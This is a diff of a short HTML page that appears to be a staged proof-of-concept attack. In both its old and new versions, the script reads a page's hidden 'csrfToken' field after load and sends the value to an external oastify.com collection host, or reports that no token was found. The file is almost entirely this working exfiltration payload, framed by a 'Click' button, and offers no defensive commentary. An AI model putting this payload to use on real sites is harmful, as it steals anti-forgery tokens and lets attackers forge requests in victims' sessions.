@@ -1,18 +1,21 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h3>Stage 3 – CSRF token exfiltration</h3>
+    <h3>CSRF Check – Stage 1</h3>
 
     <script>
-      // Wait for DOM to render
-      setTimeout(() => {
-        try {
-          const token = document.querySelector('[name="csrfToken"]').value;
-          fetch("https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/csrf?token=" + token);
-        } catch (e) {
-          fetch("https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/csrf?error=no-token");
-        }
-      }, 500);
+      window.onload = () => {
+        setTimeout(() => {
+          const tokenInput = document.querySelector('[name="csrfToken"]');
+          if (tokenInput && tokenInput.value) {
+            // CSRF token found, send it
+            fetch("https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/csrf?token=" + encodeURIComponent(tokenInput.value));
+          } else {
+            // Token not found
+            fetch("https://8aje7zfbsbe4i0w0z824l5tcb3hu5mtb.oastify.com/csrf?error=no-token-present");
+          }
+        }, 500);
+      };
     </script>
 
     <button id="installbutton">Click</button>
